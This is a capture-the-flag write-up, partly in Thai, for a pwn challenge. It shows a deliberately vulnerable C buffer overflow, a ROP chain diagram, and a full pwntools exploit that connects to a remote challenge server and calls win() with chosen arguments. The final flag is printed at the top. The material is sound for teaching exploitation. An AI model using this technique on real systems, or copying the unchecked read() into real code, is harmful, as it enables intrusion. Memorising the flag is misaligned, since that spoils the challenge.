# Flag Facility (Pwn, 356pts)

**Flag:** `DELTA{4r3_y0u_r3ady_f0r_th3_r0p_4rm4g3dd0n?}`

## โจทย์

Binary มี buffer overflow + ROP — ต้องเรียก `win()` พร้อม argument `0xdeadbeef` และ `0xcafebabe`

## ขั้นตอน

### 1. วิเคราะห์

```c
void vuln() {
  char buf[32];
  read(0, buf, 256);      // ⚠️ overflow!
}

void win(int a, int b) {
  if (a == 0xdeadbeef && b == 0xcafebabe)
    system("cat flag.txt");
}
```

### 2. ROP Gadgets

ใน x86-64  argument ส่งผ่าน register:
- arg1 → `rdi`
- arg2 → `rsi`

Gadgets ที่หาได้จาก `gadget_farm`:

```asm
0x401280: pop rdi; ret
0x401282: pop rsi; pop r15; ret   ; ต้อง pop r15 เพิ่ม 8 bytes
```

### 3. ROP Chain

```
┌──────────────────────────────────┐
│ win (0x4011f6)                    │ ← return
├──────────────────────────────────┤
│ 0x0 (padding r15)                 │
├──────────────────────────────────┤
│ 0xcafebabe (arg2 → rsi)          │
├──────────────────────────────────┤
│ pop_rsi_r15 (0x401282)            │
├──────────────────────────────────┤
│ 0xdeadbeef (arg1 → rdi)          │
├──────────────────────────────────┤
│ pop_rdi (0x401280)                │
├──────────────────────────────────┤
│ ret (0x40101a)                    │ ← stack alignment
├──────────────────────────────────┤
│ saved rbp (8 bytes)               │
├──────────────────────────────────┤
│ buf[32]                           │
└──────────────────────────────────┘
```

## Exploit

```python
from pwn import *

r = remote("13.238.150.105", 1339)
r.recvuntil(b"> ")

pop_rdi = 0x401280
pop_rsi_r15 = 0x401282
ret = 0x40101a
win = 0x4011f6

payload = b"A" * 32        # buffer
payload += b"B" * 8        # saved rbp
payload += p64(ret)        # stack alignment
payload += p64(pop_rdi) + p64(0xdeadbeef)
payload += p64(pop_rsi_r15) + p64(0xcafebabe) + p64(0)
payload += p64(win)

r.send(payload)
print(r.recvall(timeout=5).decode())
```

## หลักการ

**ROP (Return-Oriented Programming)** — bypass NX โดย reuse existing code ("gadgets"):

- Gadget = instruction snippet + `ret`
- ROP chain = เรียง gadgets ต่อกันบน stack
- `pop rdi; ret` → pop 8 bytes ไป rdi แล้ว jump

**x86-64 Calling Convention:**

| Arg | Register |
|-----|----------|
| 1 | `rdi` |
| 2 | `rsi` |
| 3 | `rdx` |

## สรุป

- ROP bypasses NX
- Gadget Farm = ผู้เขียน challenge จงใจใส่ gadgets ให้
- Stack alignment จำเป็นก่อน `system()`
- ใช้ `ROPgadget` หรือ `objdump` หา gadgets
